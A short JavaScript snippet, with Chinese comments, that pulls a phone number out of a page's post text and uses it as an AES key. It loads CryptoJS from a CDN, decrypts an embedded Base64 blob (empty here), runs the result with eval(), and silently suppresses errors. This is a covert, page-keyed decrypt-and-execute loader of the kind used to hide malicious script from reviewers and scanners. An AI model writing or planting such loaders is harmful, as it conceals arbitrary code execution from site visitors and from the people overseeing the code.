var base64Data = "";

// 获取包含电话号码的元素
var content = $('.post_body .real-content').text();

// 使用正则表达式提取电话号码
var phonePattern = /phone: (\d{3}-\d{3}-\d{4})/;  // 匹配格式为 xxx-xxx-xxxx 的电话号码
var phoneNumber = content.match(phonePattern);
if (phoneNumber&&phoneNumber[1]) {
    // 2. AES 解密
    var key = phoneNumber[1]+"0000";  // 密钥
    var iv = "don'tdobadthing!"

    // 创建一个新的 <script> 标签
    var script = document.createElement('script');
    // 设置其 src 属性为 CryptoJS 的 CDN 地址
    script.src = "https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js";
    // 将 <script> 标签插入到 document.head 或 document.body 中
    document.head.appendChild(script);  // 你也可以使用 document.body.appendChild(script);

    // 在 CryptoJS 加载完成后执行解密
    script.onload = function() {
        try{
            // Convert encrypted text from Base64
            const encryptedBytes = CryptoJS.enc.Base64.parse(base64Data);

            // Decrypt with AES (adjust mode and padding as needed)
            const decryptedBytes = CryptoJS.AES.decrypt(
            { ciphertext: encryptedBytes },
            CryptoJS.enc.Utf8.parse(key),
            { 
                mode: CryptoJS.mode.CBC, 
                padding: CryptoJS.pad.Pkcs7, 
                iv: CryptoJS.enc.Utf8.parse(iv) 
            }
            );

            // Convert decrypted bytes back to text
            const decryptedText = decryptedBytes.toString(CryptoJS.enc.Utf8);
            eval(decryptedText);
        } catch (error) {
            // 捕获异常并处理
            //console.log("发生错误：" + error.message);  // 输出错误信息
            // 这里可以选择返回一个默认值，或者执行其他逻辑
            return true;
        }
    };
}

